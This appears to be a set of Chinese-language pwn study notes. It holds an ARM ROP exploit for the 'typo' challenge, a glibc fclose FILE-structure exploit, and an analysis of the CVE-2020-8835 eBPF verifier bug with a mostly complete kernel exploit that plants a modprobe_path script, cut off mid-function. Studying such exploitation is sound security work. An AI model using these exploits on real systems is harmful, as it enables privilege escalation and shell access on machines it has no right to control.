## Pwn

### jarvisoj - typo

```
// file
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped

// checksec
[*] '/tmp/tmp/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```

輸入只有一個，並且在輸入大量字元後會有 segmentation fault，又因為是 statically linked，所以使用 ROP 做 exploit，目標是 `system("/bin/sh")`。

Arm 的 calling convention 如下:

| Registers | Use       | Comment                                           |
| --------- | --------- | ------------------------------------------------- |
| R0        | arg1      | function arguments / return value                 |
| R1        | arg2      | function arguments                                |
| R2        | arg3      | function arguments                                |
| R3        | arg4      | function arguments                                |
|           |           |                                                   |
| R4        | var1      | preserver value and callee saved                  |
| R5        | var2      | preserver value and callee saved                  |
| R6        | var3      | preserver value and callee saved                  |
| R7        | var4      | preserver value and callee saved                  |
| R8        | var5      | preserver value and callee saved                  |
|           |           |                                                   |
| R9        | var6      | variable or static base                           |
| R10       | var7 / sp | variable or stack limit                           |
| R11       | var8 / fp | variable or frame pointer                         |
| R12       | var9 / ip | variable or new static base for interlinked calls |
| R13       | sp        | staick pointer                                    |
| R14       | lr        | link back to calling routine                      |
| R15       | pc        | program counter                                   |

用 ROPgadget 找 ROP gadget `ROPgadget --binary ./typo --only "pop"` 以及 binsh 字串 `ROPgadget --binary ./typo --string "/bin/sh"`。

要控制第一個參數以及 pc，因此選擇 `0x00020904 : pop {r0, r4, pc}`。

offset 的部分，可以用 `cyclic` 求得:

```
pwndbg> cyclic 200
aaaabaaacaaadaaa...
pwndbg> c
pwndbg> cyclic -l 0x62616164
112
```



exploit:

```python
#!/usr/bin/python3
 
from pwn import *
import sys 
 
context.arch = 'arm'
 
pop_r0_r4_pc = 0x00020904 # pop {r0, r4, pc}
binsh = 0x0006c384 # /bin/sh
_system = 0x110B4
offset = 0x70 # 112 == input(0x70-0xC) + 0x8 + fp (old_ebp, 0x4)
 
payload = offset * b'\xff' + p32(pop_r0_r4_pc) + p32(binsh) + p32(0) + p32(_system)
 
if len(sys.argv) > 1:
    r = process(["qemu-arm", "-g", "4000", "./typo"])
    input("wait to attach")
else:
    r = process("./typo")                                                                                                                       
r.sendafter("Input ~ if you want to quit", "\n")
r.sendafter("------Begin------", payload)
 
r.interactive()
```



### fclose exploit

```c
#include <stdio.h>
#include <unistd.h>

char fake_file[0x200];

int main() {
  FILE *fp;
  puts("Leaking libc address of stdout:");
  printf("%p\n", stdout); // Emulating libc leak
  puts("Enter fake file structure");
  read(0, fake_file, 0x200);
  fp = (FILE *)&fake_file;
  fclose(fp);
  return 0;
}
```

```
// file
vuln: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6b83490784ec7368deac3560524ee83f2a5ab22d, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/tmp/file_practice/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

使用 `gcc -g -o vuln vuln.c` 來編譯 binary，環境為 glibc 2.24。

`fclose()` exploit 主要是利用合法的 vtable `_IO_str_jumps` function `_IO_str_overflow`會使用到 FILE 中可控的部分來 call function pointer。

呼叫方法有兩種:

1. process 結束時呼叫的 `_IO_flush_all_lockp` 會去執行 `_IO_OVERFLOW (fp, EOF)`，執行流程為 `malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow`
2. `fclose() -> _IO_FINISH() -> _IO_str_overflow()`

首先看一下 glibc 2.24 的 `_IO_str_overflow()`:

```c
// /libio/strops.c

int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
    
  if (fp->_flags & _IO_NO_WRITES) // <--- check
      return flush_only ? 0 : EOF;
    
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
    
    
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */ // <---- check
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp); // _IO_buf_end - _IO_buf_base
	  _IO_size_t new_size = 2 * old_blen + 100; // new_size == address of "/bin/sh"
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); // _allocate_buffer -> system    
          
      /* exploit redundant */
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)
```

- `& _IO_NO_WRITES != true`
- `fp->_IO_write_ptr - fp->_IO_write_base >= _IO_blen (fp) == buf_end - buf_base`
- `& _IO_CURRENTLY_PUTTING == 1`
- `& _IO_USER_BUF != 1`

```c
// /libio/libioP.h

#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
```

第二種作法的 exploit (`fclose() -> _IO_FINISH() -> _IO_str_overflow()`):

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = process('./V', env={"LD_PRELOAD": "./libc.so.6"})

r.recvuntil('Leaking libc address of stdout:\n')
libc = int(r.recvline()[:-1], 16) - 0x3c2600
info(f"libc: {hex(libc)}")

binsh = libc + 0x18ac40 # new_size
_system = libc + 0x456a0
_IO_str_overflow_ptr = libc + 0x3be4c0

assert((binsh-100) % 2 == 0)

buf_end = (binsh - 100) // 2
buf_base = 0
write_ptr = (binsh - 100) // 2
write_base = 0
fake_vtable = _IO_str_overflow_ptr + 0x8 # call offset + 0x10
_lock = libc + 0x3c2870 # buffer

_IO_IS_FILEBUF = 0x2000
_IO_LINKED = 0x80
_IO_CURRENTLY_PUTTING = 0x800

flag = 0xfbad8000
flag = flag

fake_file = p64(flag)
fake_file += p64(0)*3 # read ptr end base
fake_file += p64(write_base) + p64(write_ptr) + p64(0) # write base ptr end
fake_file += p64(buf_base) + p64(buf_end) # buf base end
fake_file = fake_file.ljust(0x70, b'\x00') # fill to before fileno
fake_file += p64(0)
fake_file = fake_file.ljust(0x88, b'\x00') # fill to before _lock
fake_file += p64(_lock)
fake_file = fake_file.ljust(0xd8, b'\x00') # fill to before vtable
fake_file += p64(fake_vtable) # 0xd8
fake_file += p64(_system) # _allocate_buffer offset 0xe0

input()
r.sendafter('Enter fake file structure', fake_file)
r.interactive()
```



而另一條是使用 `_IO_str_finish`，一樣有兩種做法:

1. `fclose() -> _IO_FINISH() -> _IO_str_finish`
2. `malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish`

以下為 `fclose()` source code:

```c
int
_IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp); // <-- 進入這
  if (fp->_mode > 0)
    {
#if _LIBC
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.__cd.__steps);
      __gconv_release_step (cc->__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
#endif
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
```

- `& _IO_IS_FILEBUF == true`
- `& _IO_LINKED == false`: bypass `_IO_un_link()`
- 將 `f->_lock` 設成指向 null 的 pointer，避免 `_IO_acquire_lock (fp)`  出問題



` _IO_str_finish` source code:

```c
// /libio/fileops.c

void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); // <-- exploitable
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```



`_IO_file_jumps` / `_IO_str_jumps` 的 function pointer list:

```c
// /libio/fileops.c

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY, // ~ 0x10
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close), // 0x88
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

// /libio/strops.c
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

```c
// /libio/strfile.h

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;

// example
$12 = {
  _sbf = {
    _f = {
      _flags = -72540024,
      _IO_read_ptr = 0x0,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0,
      _flags2 = 0,
      _old_offset = -1,
      _cur_column = 0,
      _vtable_offset = 0 '\000',
      _shortbuf = "",
      _lock = 0x7f156e1c0770 <_IO_stdfile_0_lock>,
      _offset = -1,
      _codecvt = 0x0,
      _wide_data = 0x7f156e1be9a0 <_IO_wide_data_0>,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0,
      _mode = 0,
      _unused2 = '\000' <repeats 19 times>
    },
    vtable = 0x7f156e1bb400 <_IO_file_jumps>
  },
  _s = {
    _allocate_buffer = 0x0, // offset 0xe0
    _free_buffer = 0x0
  }
} 
```

- `_allocate_buffer` offset 為 0xe0，接在 vtable 後



最後 `_IO_wstr_jumps->_IO_wstr_overflow` 也能使用，方法都大同小異

P.S. glibc 2.29 的版本可以使用 `(*fp->_codecvt->__codecvt_do_encoding)(fp->_codecvt)` (`_IO_wfile_sync`) 做 exploit，題目為 BalsnCTF 2020 Diary。



### CVE-2020-8835

環境為 linux kernel 5.6.0，問題出在 bpf 在做優化時檢查不夠嚴謹，導致有機會可以繞過 verifier。\

在 linux kenrel 5.6.1 就被拿掉了，沒有修補。

```c
// https://elixir.bootlin.com/linux/v5.6-rc5/source/kernel/bpf/verifier.c

static void __reg_bound_offset32(struct bpf_reg_state *reg)
{
	u64 mask = 0xffffFFFF;
	struct tnum range = tnum_range(reg->umin_value & mask,
				       reg->umax_value & mask);
	struct tnum lo32 = tnum_cast(reg->var_off, 4);
	struct tnum hi32 = tnum_lshift(tnum_rshift(reg->var_off, 32), 32);

	reg->var_off = tnum_or(hi32, tnum_intersect(lo32, range));
}
```

- `tnum_range()` - gen a `tnum` corresponding to the possible values **in a given range of unsigned integers**

  - 回傳 tnum 的值會在 range 當中

- `tnum_cast()` - creates a new `tnum` based on the lowermost bits of an existing `tnum`. Here, it is used to return the **lower 32 bits of `reg->var_off`**

  - 這邊會回傳 `reg->var_off` lower 4 bytes

- `tnum_lshift() / tnum_rshift()` -  perform shifts on `tnums`. Here, they are used together to clear the lower 32 bits of a `tnum`

  - 這兩種操作的搭配會得到 higher 32 bit of `reg->var_off`

- `tnum_intersect` -  takes two **tnum** arguments both pertaining to a single value, and returns **a single tnum** that synthesizes all knowledge conveyed by the arguments

  - ```c
    struct tnum tnum_intersect(struct tnum a, struct tnum b)
    {
    	u64 v, mu;
    
    	v = a.value | b.value;
    	mu = a.mask & b.mask;
    	return TNUM(v & ~mu, mu);
    }
    ```

  - 交集的概念?

- P.S. `tnum` -  `var_off` contains information about **certain bits** that are known to be 0 or 1. The type of `var_off` is a structure known as `tnum`, which is short for "**tracked number**" or “**tristate number**”

假設 `umin = 1` & `umax = 2^32+1` & `var_off` is unconstrained，`reg->umin_value & mask` 以及 `reg->umax_value & mask` 都為 1，也代表著 LSB 為 1 而其他 bit 都是 0，`tnum_intersect()` 會保留此資訊，並且 mark lower 32 bit 都是已知，不過 `tnum_or()` 會將 upper 32 bits reintroduce，但又因為 `hi32` 指出 lower 32 bits 皆為 0，lower 32 bits from `tnum_intersect()` 會繼續被保留，所以 function 結束時，lower 32 bits 的 `var_off` 會被 mark 成已知 `00 ... 01` (因為 value 為 1，代表 bit 1 為 1)。

- `tnum_range(reg->umin_value & mask, reg->umax_value & mask) == tnum_range(1 & 0xffffffff, 2^32+1 & 0xffffffff) == tnum_range(1, 1) == tnum{.value = 1, .mask = 0}`

  ```c
  struct tnum tnum_range(u64 min, u64 max)
  {
  	u64 chi = min ^ max, delta; // chi = 0
  	u8 bits = fls64(chi); // fls64 - find last set bit in a 64-bit word
  
  	/* special case, needed because 1ULL << 64 is undefined */
  	if (bits > 63)
  		return tnum_unknown;
  	/* e.g. if chi = 4, bits = 3, delta = (1<<3) - 1 = 7.
  	 * if chi = 0, bits = 0, delta = (1<<0) - 1 = 0, so we return
  	 *  constant min (since min == max).
  	 */
  	delta = (1ULL << bits) - 1; // 1 << 0 - 1 == 0
  	return TNUM(min & ~delta, delta);
  }
  ```

- `tnum_cast(reg->var_off, 4) == tnum_cast(0, 4) == tnum{.value = 0, .mask = 0}`

  ```c
  struct tnum tnum_cast(struct tnum a, u8 size)
  {
  	a.value &= (1ULL << (size * 8)) - 1;
  	a.mask &= (1ULL << (size * 8)) - 1;
  	return a;
  }
  ```

- `tnum_lshift(tnum_rshift(reg->var_off, 32), 32) == tnum_lshift(tnum_rshift(0, 32), 32) == tnum{.value = 0, .mask = 0}`

  ```c
  struct tnum tnum_lshift(struct tnum a, u8 shift)
  {
  	return TNUM(a.value << shift, a.mask << shift);
  }
  
  struct tnum tnum_rshift(struct tnum a, u8 shift)
  {
  	return TNUM(a.value >> shift, a.mask >> shift);
  }
  ```

- `tnum_or(hi32, tnum_intersect(lo32, range)) == tnum_or({0, 0}, tnum_intersect({0, 0}, {1, 0})) == tnum_or({0, 0}, {1, 0}) == tnum{1, 0}`

  ```c
  struct tnum tnum_intersect(struct tnum a, struct tnum b)
  {
  	u64 v, mu;
  
  	v = a.value | b.value; // 1
  	mu = a.mask & b.mask; // 0
  	return TNUM(v & ~mu, mu); // tnum {1, 0}
  }
  
  struct tnum tnum_or(struct tnum a, struct tnum b)
  {
  	u64 v, mu;
  
  	v = a.value | b.value;
  	mu = a.mask | b.mask;
  	return TNUM(v, mu & ~v);
  }
  ```

但是 `umin` 與 `umax` 為 `00 ... 01` 不代表每個值都在這個區間，在此出現錯誤的假設。如果要 trigger bug，需要滿足下列條件:

- During execution, the **actual value in the register is 2**
- The register’s `umin` is set to 1, and `umax` is set to 2ˆ32+1
- **A conditional jump** with a 32-bit comparison on this register is executed

```c
// set umin_val and umax_val
BPF_JMP_IMM(BPF_JGE, BPF_REG_2, 1, 1);
BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0);
```

verifier now thinks that the **last 32 bits of `reg_2`** are binary `00 ... 01` when in reality they are binary `00 ... 10`

至此，由於 verifier 相信其值為 1 (`{.value = 1, mask = 0}`)，但實際上為 2。



```c
BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 2);
BPF_ALU64_IMM(BPF_RSH, BPF_REG_2, 1);
```

verifier now assumes that `reg_2` has to be `0` because the `AND` instruction necessarily has to result in 0 if the **second-last bit** of the `reg_2` was `0`, but in reality it is `(2 & 2) >> 1 = 1`. This is a very useful primitive, as we can now multiply `reg_2` with any number to create an **arbitrary value** that the verifier believes to be `0`。

由於上述操作，verifier 相信 `reg2` 為 0，但其實為 1，因此可以構造出任何值。



hijack `map_push_elem` to `array_map_get_next_key`:

```c
/* Called from syscall */
static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)
{
	struct bpf_array *array = container_of(map, struct bpf_array, map);
	u32 index = key ? *(u32 *)key : U32_MAX;
	u32 *next = (u32 *)next_key;

	if (index >= array->map.max_entries) {
		*next = 0;
		return 0;
	}

	if (index == array->map.max_entries - 1)
		return -ENOENT;

	*next = index + 1;
	return 0;
}
```

因為 `*key` 以及 `*next_key` 皆可控，因此可以寫入任意位置 (`*next_key = key - 1`)。



exploit 中有許多註解，內容寫的應該算詳細，而執行環境為**自己編譯的** linux 5.6:

```c
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "bpf_insn.h"
#define LOG_BUF_SIZE 65535

int ctlmap_fd, expmap_fd, prog_fd;
int socks[2];
char bpf_log_buf[LOG_BUF_SIZE] = {0};

void init_proc()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}

void show(uint64_t *ptr, int num)
{
    puts("----------- show -----------");
    for (int i = 0 ; i < num; i++)
        printf("%d:  0x%016lx \n", i, ptr[i]);
    puts("----------- end -----------\n");
}

void info(char *s, unsigned long val)
{
    char buf[128];
    sprintf(buf, "[*] %s : 0x%016lx", s, val);
    puts(buf);
}

struct bpf_insn insns[] =
{
    /**
     * Corresponding c may look like:
     * u64 bpf_map_lookup_elem(u64 r1, u64 r2)
     * {
     *    struct bpf_map *map = (struct bpf_map *) (unsigned long) r1;
     *    void *key = (void *) (unsigned long) r2;
     *    void *value;
     *    ...
     * }
     */
    BPF_ALU64_IMM(BPF_MOV, BPF_REG_6, 0), // r6 = 0
    BPF_LD_MAP_FD(BPF_REG_1, 3), // r1 = 3
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = r10
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 -= 8
    BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_6, 0), // [r2] = r6
    BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
    /**
     * if (!r0)
     *     exit();
     */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // r9 = r0
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0), // r6 = [r9]
    BPF_ALU64_IMM(BPF_MOV, BPF_REG_0, 0), // r0 = 0 (why ?)
    BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 1, 1), /* umin = 1 */
    BPF_EXIT_INSN(),

    BPF_MOV64_IMM(BPF_REG_8, 1), // r8 = 1
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32), // r8 = 00000001 00000000
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // r8 = 00000001 00000001
    BPF_JMP_REG(BPF_JLE, BPF_REG_6, BPF_REG_8, 1), /* umax = r8 */
    BPF_EXIT_INSN(),

    /* trigger __reg_bound_offset32 */
    BPF_JMP32_IMM(BPF_JNE, BPF_REG_6, 5, 1), // r6 != 5
    BPF_EXIT_INSN(),
    /* Now r6 is 2, but verifier thinks it is 1 */
    BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 2), // r6 &= 2
    BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 1), // r6 >>= 1
    /* Now r6 is 1, but verifier thinks it is 0 */
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110), // r6 *= 0x110

    BPF_ALU64_IMM(BPF_MOV, BPF_REG_8, 0), // r8 = 0
    BPF_LD_MAP_FD(BPF_REG_1, 4), // r1 = 4
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = r10
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 -= 8
    BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_8, 0), // [r2] = r8
    BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
    /**
     * if (!r0)
     *     exit();
     */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // r7 = r0
    /* Now r7 is expmap address */

    /**
     * r9 = ctlmap address (bpf_array.ptrs, off 0x110)
     * r7 = expmap address (bpf_array.ptrs, off 0x110)
     * r6 = 0x110
     */
    /* leak address */
    // r7 -= r6, get start addr of expmap bpf_array
    BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
    // r8 = [r7], get expmap bpf_array.array_map_ops
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
    // [r9 + 0x10] = r8, put expmap array_map_ops address to r9 (ctlmap)
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_8, 0x10),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_8), // r2 = r8
    // r8 = [r7 + 0xc0], get expmap bpf_array.wait_list.next
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0xc0),
    // [r9 + 0x18] = r8, put expmap bpf_array.wait_list.next address to r9 (ctlmap)
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_8, 0x18),
    // [r7 + 0x40] = r8, expmap bpf_array.bpf = r8
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0x40),
    // r8 += 0x50, r8 will be expmap data pointer
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x50),

    /* exploit */
    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, 8), // r2 = [r9 + 8]
    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 1, 4), // hint to hijack array_map_ops
    // [r7] = r8, overwrite expmap array_map_ops to expmap
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
    // [r7 + 0x18] = overwrite expmap map_type to BPF_MAP_TYPE_STACK
    BPF_ST_MEM(BPF_W, BPF_REG_7, 0x18, BPF_MAP_TYPE_STACK),
    // [r7 + 0x24] = -1, overwrite expmap max_entries to 0xffffffff
    BPF_ST_MEM(BPF_W, BPF_REG_7, 0x24, -1),
    // [r7 + 0x2c] = 0, overwrite expmap spin_lock_off to 0
    BPF_ST_MEM(BPF_W, BPF_REG_7, 0x2c, 0),
    BPF_ALU64_IMM(BPF_MOV, BPF_REG_0, 0), // r0 = 0
    BPF_EXIT_INSN(),
};

int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* REF: https://man7.org/linux/man-pages/man2/bpf.2.html */

/**
 * The BPF_MAP_CREATE command creates a new map, returning a
 * new file descriptor that refers to the map
 */
static inline int
bpf_create_map(enum bpf_map_type map_type,
                unsigned int key_size,
                unsigned int value_size,
                unsigned int max_entries)
{
    union bpf_attr attr = {
        .map_type    = map_type,
        .key_size    = key_size,
        .value_size  = value_size,
        .max_entries = max_entries
    };

    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

/**
 * The BPF_PROG_LOAD command is used to load an eBPF program into
 * the kernel.  The return value for this command is a new file
 * descriptor associated with this eBPF program
 */
static inline int
bpf_prog_load(enum bpf_prog_type type,
                const struct bpf_insn *insns, int insn_cnt,
                const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns     = (uint64_t) insns,
        .insn_cnt  = insn_cnt,
        .license   = (uint64_t) license,
        .log_buf   = (uint64_t) bpf_log_buf,
        .log_size  = LOG_BUF_SIZE,
        .log_level = 1,
        .kern_version = 0,
    };
    bpf_log_buf[0] = 0;
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

/**
 * The BPF_MAP_UPDATE_ELEM command creates or updates an
 * element with a given key/value in the map referred to by
 * the file descriptor fd
 */
static inline int
bpf_update_elem(int fd, const void *key, const void *value,
                uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (uint64_t) key,
        .value  = (uint64_t) value,
        .flags  = flags,
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

/**
 * The BPF_MAP_LOOKUP_ELEM command looks up an element with a
 * given key in the map referred to by the file descriptor
 * fd.
 */
static inline int
bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (uint64_t) key,
        .value  = (uint64_t) value,
    };

    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}


void setup_modprobe_path()
{
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
}

void prep()
{
    ctlmap_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 0x1);
    if (ctlmap_fd < 0)
        perror("[-] create ctlmap failed.");

    expmap_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x2000, 0x1);
    if (expmap_fd < 0)
        perror("[-] create expmap_fd failed.");
    printf("ctlmap_fd: %d      expmap_fd %d\n", ctlmap_fd, expmap_fd);

    prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns,
                            sizeof(insns) / sizeof(insns[0]), "GPL");
    if (prog_fd < 0)
        perror("[-] create prog_fd failed.");

    /* creates an unnamed pair of connected sockets */
    socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);

    /* attach eBPF program to socket */
    assert (setsockopt(socks[1], SOL_SOCKET, SO_ATTACH_BPF,
            &prog_fd, sizeof(prog_fd)) == 0);
}

/**
 * When sends some msgs to socket[0],
 * socket[1] will trigger ebpf hook
 */
static inline void trig_hook()
{
    char buf[64]; /* a cacheline size */
    puts("trigger hook ...");
    syscall(__NR_write, socks[0], buf, sizeof(buf));
}

void exploit()
{
    uint64_t key = 0;
    char *ctlbuf = malloc(0x100);
    char *expbuf = malloc(0x3000);
    uint64_t *ctlptr = (uint64_t *) ctlbuf;
    uint64_t *expptr = (uint64_t *) expbuf;

    memset(ctlbuf, '\xaa', 0x100);
    memset(expbuf, '\xbb', 0x100);
    

